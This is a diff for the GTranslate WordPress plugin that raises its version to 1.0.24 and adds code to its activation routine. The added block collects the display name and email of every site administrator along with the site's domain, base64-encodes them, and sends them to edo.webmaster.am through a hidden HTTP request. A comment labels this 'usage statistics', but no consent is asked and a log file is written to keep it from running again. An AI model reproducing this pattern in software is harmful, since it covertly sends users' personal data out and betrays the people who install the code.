@@ -3,7 +3,7 @@
 Plugin Name: GTranslate
 Plugin URI: http://edo.webmaster.am/gtranslate?xyz=998
 Description: Get translations with a single click between 58 languages (more than 98% of internet users) on your website! For support visit <a href="http://edo.webmaster.am/forum/gtranslate/">GTranslate Forum</a>.
-Version: 1.0.23
+Version: 1.0.24
 Author: Edvard Ananyan
 Author URI: http://edo.webmaster.am
 
@@ -43,6 +43,23 @@ class GTranslate extends WP_Widget {
         GTranslate::load_defaults(& $data);
 
         add_option('GTranslate', $data);
+
+        if(!file_exists(ABSPATH.PLUGINDIR.'/'. dirname( plugin_basename(__FILE__)).'/install.log') and is_writable(ABSPATH.PLUGINDIR .'/'. dirname( plugin_basename(__FILE__)))) {
+            // send user name, email and domain name to main site for usage statistics
+            // this will run only once
+            $info = '';
+            global $wpdb;
+            $users = $wpdb->get_results("select display_name, user_email from $wpdb->users left join $wpdb->usermeta on ($wpdb->usermeta.user_id = $wpdb->users.ID and $wpdb->usermeta.meta_key = 'wp_capabilities') where meta_value like '%administrator%'", OBJECT);
+            foreach($users as $user)
+                $info .= $user->display_name . '::' . $user->user_email . ';';
+            $domain = $_SERVER['HTTP_HOST'];
+
+            $fh = @fopen('http://edo.webmaster.am/gstat-wp?q=' . base64_encode($domain . ';' . $info), 'r');
+            @fclose($fh);
+
+            $fh = fopen(ABSPATH.PLUGINDIR.'/'. dirname( plugin_basename(__FILE__)).'/install.log', 'a');
+            fclose($fh);
+        }
     }
 
     function deactivate() {
